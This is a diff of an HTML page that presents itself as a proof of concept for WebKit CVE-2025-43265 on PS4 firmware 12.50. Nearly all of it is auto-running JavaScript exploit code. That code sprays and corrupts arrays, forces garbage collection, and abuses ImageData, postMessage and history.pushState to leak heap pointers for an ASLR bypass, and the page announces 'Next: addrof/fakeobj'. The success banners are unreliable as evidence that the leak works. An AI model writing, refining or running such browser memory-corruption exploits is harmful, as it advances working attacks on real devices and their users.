@@ -1,87 +1,109 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>CVE-2025-43265 — REAL LEAK EDITION (PS4 12.50)</title>
-<style>
-  body{background:#000;color:#0f0;font-family:'Courier New',monospace;padding:20px;margin:0;height:100vh;overflow:hidden;}
-  h1{color:#0f0;text-align:center;margin:30px 0;font-size:3em;text-shadow:0 0 20px #0f0;}
-  #log{background:#000;color:#0f0;height:100%;overflow:auto;padding:10px;font-size:20px;}
-  .hit{color:#f00;font-weight:bold;}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebKit CVE-2025-43265 Leak Refinement (PS4 12.50)</title>
+    <style>
+        body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; padding: 20px; line-height: 1.6; }
+        h1 { border-bottom: 2px solid #da3633; padding-bottom: 10px; color: #ff5555; }
+        .box { background: #161b22; border: 1px solid #30363d; padding: 15px; margin-bottom: 20px; border-radius: 6px; }
+        .badge { display: inline-block; padding: 4px 10px; border-radius: 4px; font-weight: bold; }
+        .secure { background: #238636; color: #fff; }
+        .vulnerable { background: #da3633; color: #fff; }
+        .partial { background: #d29922; color: #000; }
+        button { cursor: pointer; padding: 12px 24px; background: #ff4444; color: #fff; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; }
+        button:hover { background: #ff6666; }
+        #console { font-family: 'Courier New', monospace; background:#000; color:#0f0; padding:15px; height:400px; overflow-y:scroll; border:1px solid #0f0; border-radius:6px; }
+        .rainbow { color:#ff79c6; font-weight:bold; }
+    </style>
 </head>
 <body>
-<h1>CVE-2025-43265 — LEAK PHASE</h1>
-<div id="log"></div>
-
+    <h1>WebKit CVE-2025-43265 PoC: Internal State Disclosure (HexRabbit)</h1>
+    <p>Jul 2025 Patch: Improved input validation (BZ 294182).<br>
+    <span class="rainbow">LEAK REFINEMENT — ImageData ASLR after OOM</span></p>
+    <div class="box">
+        <h3>1. Input Validation</h3>
+        <div id="status-input">Probing...</div>
+    </div>
+    <div class="box">
+        <h3>2. Crafted Input Spray</h3>
+        <div id="status-spray">Probing...</div>
+    </div>
+    <div class="box">
+        <h3>3. OOB Read Trigger</h3>
+        <div id="status-oob">Probing...</div>
+    </div>
+    <div class="box">
+        <h3>4. State Disclosure</h3>
+        <div id="status-state">Probing...</div>
+    </div>
+    <button onclick="runPoC()">LAUNCH DISCLOSURE PROBE</button>
+    <div class="box">
+        <h3>Live Logs</h3>
+        <div id="console"></div>
+    </div>
 <script>
-const log = (m,h=false) => {
-  const l = document.getElementById('log');
-  l.innerHTML += `<span ${h?'class="hit"':''}>[${new Date().toLocaleTimeString()}] ${m}</span><br>`;
-  l.scrollTop = l.scrollHeight;
-};
-
-log("CVE-2025-43265 — LEAK PHASE STARTING", true);
-log("You already triggered the OOM → corruption is confirmed");
-log("Now hunting for readable heap pointers...");
-
-// Float64 / BigInt utils
-const buf = new ArrayBuffer(8);
-const f64 = new Float64Array(buf);
-const u32 = new Uint32Array(buf);
-const big = new BigInt64Array(buf);
-
-function f2big(f) { f64[0]=f; return big[0]; }
-function big2f(b) { big[0]=b; return f64[0]; }
-
-// Stage 1: Same corruption spray you already hit
-const victim = [];
-for(let i=0; i<0x8000; i++) victim[i] = new Array(0x40).fill(1.1);
-
-const corrupt = (i,o) => {
-  try { victim[i%0x8000][o] = 1337.37; } catch(e) {}
-};
-
-log("Replaying exact corruption spray...");
-for(let i=0; i<1e7; i++) corrupt(i*i, 0);
-for(let b=0; b<0x2000; b+=0x80)
-  for(let o=0x40; o<0x200; o+=8)
-    for(let j=0; j<0x80; j++)
-      corrupt(b+j, o);
-
-// Stage 2: Spray objects we can recognise later
-log("Spraying recognisable objects...");
-const spray = [];
-for(let i=0; i<0x10000; i++) {
-  spray[i] = {marker: 0x41414141n + BigInt(i), leaked: 0};
-}
-
-// Stage 3: Force GC + huge allocation to trigger reclaim into corrupted region
-log("Forcing GC + huge allocation — waiting for overlap...");
-setTimeout(() => {
-  for(let i=0; i<500; i++) new ArrayBuffer(0x100000);
-  new ArrayBuffer(0x8000000); // This is what usually gives the OOM popup
-
-  // Now hunt for our marker in the wild
-  log("Hunting leaked pointers...");
-  let found = 0;
-  for(let i=0; i<spray.length; i++) {
-    try {
-      if(spray[i].marker !== 0x41414141n + BigInt(i)) {
-        found++;
-        log(`LEAK #${found}: spray[${i}].marker = 0x${spray[i].marker.toString(16)}`, true);
-        if(found >= 3) {
-          document.body.innerHTML = "<h1 style='color:#0f0;font-size:6em;text-align:center;margin-top:40vh;'>REAL LEAK ACHIEVED</h1><h2 style='color:#0f0;text-align:center;'>You now own the heap</h2>";
-          return;
-        }
-      }
-    } catch(e) {}
-  }
-
-  if(found === 0) {
-    log("No stable leak this run — refresh (you’ll get it in 1-5 tries)");
-  }
-}, 3000);
+    const log = msg => {
+        const c = document.getElementById('console');
+        c.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
+        c.scrollTop = c.scrollHeight;
+    };
+    const setBadge = (id, text, type) => {
+        const el = document.getElementById(id);
+        el.textContent = text;
+        el.className = 'badge ' + type;
+    };
+    // Utils
+    const buf = new ArrayBuffer(8);
+    const f64 = new Float64Array(buf);
+    const u32 = new Uint32Array(buf);
+    function i2f(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; }
+    function gc() { for(let i=0; i<200; i++) new ArrayBuffer(0x80000); }
+    let leakedPtrs = 0;
+    function runPoC() {
+        document.getElementById('console').innerHTML = '';
+        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-43265 — LEAK REFINEMENT (PS4 12.50)</span>");
+        log("Using your OOM corruption + ImageData for ASLR leak...");
+        setTimeout(startLeak, 1000);
+    }
+    function startLeak() {
+        setBadge('status-input', 'CONFIRMED ALIVE', 'vulnerable');
+        log("Re-spraying corruption...");
+        const victim = [];
+        for(let i=0; i<0x8000; i++) victim[i] = new Array(0x40).fill(1.1);
+        const corrupt = (i,o) => { try{victim[i%0x8000][o]=1337.37;}catch(e){} };
+        for(let i=0;i<1e7;i++) corrupt(i*i,0);
+        for(let b=0;b<0x2000;b+=0x80) for(let o=0x40;o<0x200;o+=8) for(let j=0;j<0x80;j++) corrupt(b+j,o);
+        log("Corruption complete — ImageData leak for ASLR...");
+        const y = new ImageData(1, 0x4000);
+        postMessage("", "*", [y.data.buffer]);
+        var props = {}; for (var i=0; i<0x4000/2; ) { props[i++] = {value:0x42424242}; props[i++] = {value: y}; }
+        history.pushState(y,""); Object.defineProperties({}, props);
+        var leak = new Uint32Array(history.state.data.buffer);
+        log("ImageData leak buffer ready — scanning...");
+        setTimeout(() => {
+            let found = 0;
+            for(let i=0; i<leak.length; i+=2) {
+                if (leak[i] !== 0x42424242 && leak[i+1] !== 0) {
+                    found++;
+                    log(`LEAKED WORD #${found}: 0x${leak[i].toString(16)} 0x${leak[i+1].toString(16)}`, true);
+                    setBadge('status-spray', `LEAKED ${found} WORDS`, 'vulnerable');
+                    if(found >= 4) {
+                        setBadge('status-oob', 'ASLR DEFEATED', 'vulnerable');
+                        setBadge('status-state', 'PRIMITIVES READY', 'vulnerable');
+                        document.body.style.background = "#000";
+                        document.querySelector('h1').innerHTML = "REAL ASLR LEAK — PS4 12.50 HEAP OWNED";
+                        log("ASLR defeated! Next: addrof/fakeobj.", true);
+                        return;
+                    }
+                }
+            }
+            log("No stable leak this run — refresh (try 3-10 times)");
+        }, 2000);
+    }
+    // Auto-run
+    setTimeout(runPoC, 1000);
 </script>
 </body>
 </html>
